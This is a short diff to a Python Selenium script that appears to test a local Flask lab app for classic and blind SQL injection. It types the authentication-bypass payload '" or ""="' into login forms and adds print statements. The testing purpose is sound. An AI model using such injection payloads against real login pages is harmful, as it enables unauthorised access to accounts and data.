@@ -41,6 +41,7 @@ def getlogin(firefox):
 
 def classic(firefox):
     firefox.get('http://localhost:5000/sql_classic') # test against flask app
+    print("Tyring to perform classic SQL Injection..")
     user = firefox.find_element_by_name('username')
     user.send_keys('" or ""="')
     password = firefox.find_element_by_name('password')
@@ -48,12 +49,14 @@ def classic(firefox):
     loginbtn = firefox.find_element_by_id('Login')
     loginbtn.click()
     time.sleep(5)
+    print(firefox.page_source)
     if "test123" in firefox.page_source:
         print("Success Caught: Valid SQL Injection!")
     return firefox
 
 def blind(firefox):
     firefox.get('http://localhost:5000/sql_blind') # test against flask app
+    print("Tyring to perform blind SQL Injection..")
     user = firefox.find_element_by_name('username')
     user.send_keys('" or ""="')
     password = firefox.find_element_by_name('password')
@@ -61,6 +64,7 @@ def blind(firefox):
     loginbtn = firefox.find_element_by_id('Login')
     loginbtn.click()    
     time.sleep(5)
+    print(firefox.page_source)
     if "Login" in firefox.page_source:
         print("Success Caught: SQL blind")
     return firefox
